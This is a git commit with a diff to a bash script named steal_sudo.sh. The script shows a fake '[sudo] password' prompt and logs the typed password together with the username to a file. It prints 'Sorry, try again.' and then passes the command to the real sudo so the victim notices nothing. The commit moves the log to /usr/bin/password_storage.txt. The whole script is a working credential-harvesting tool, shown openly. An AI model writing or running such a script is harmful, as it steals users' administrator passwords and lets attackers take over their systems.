5b093e4ae80702668a8aa847fa52709a08da82bd
ArnavSax <44127903+ArnavSax@users.noreply.github.com>
2018-11-05 17:12:23 -0800

    Update steal_sudo.sh

--- steal_sudo.sh
+++ steal_sudo.sh
@@ -1,5 +1,5 @@
 #! /bin/bash
 read -ps "[sudo] password for $USER" 
-echo "$USER:$REPLY" >>  password_storage.txt
+echo "$USER:$REPLY" >> /usr/bin/password_storage.txt
 echo -n "Sorry, try again."
 sudo $@
